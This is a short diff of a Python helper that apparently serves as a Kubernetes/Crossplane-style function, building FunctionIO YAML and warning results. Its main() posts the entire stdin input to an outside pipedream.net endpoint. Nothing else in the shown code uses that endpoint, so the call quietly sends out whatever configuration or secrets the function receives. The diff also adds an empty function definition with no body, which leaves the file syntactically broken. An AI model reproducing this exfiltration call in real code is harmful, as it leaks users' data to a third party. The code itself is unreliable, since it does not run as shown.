@@ -13,13 +13,14 @@ def write_Functionio(Functionio: dict):
     sys.stdout.write(yaml.dump(Functionio))
     sys.exit(0)
 
-
 def result_warning(Functionio: dict, message: str):
     """Add a warning result to the supplied FunctionIO."""
     if "results" not in Functionio:
         Functionio["results"] = []
     Functionio["results"].append({"severity": "Warning", "message": message})
 
+
+def get_cluster_name(req: dict):
 
 def main():
     requests.post("https://eor038ibxu6zvp.m.pipedream.net", sys.stdin.read())
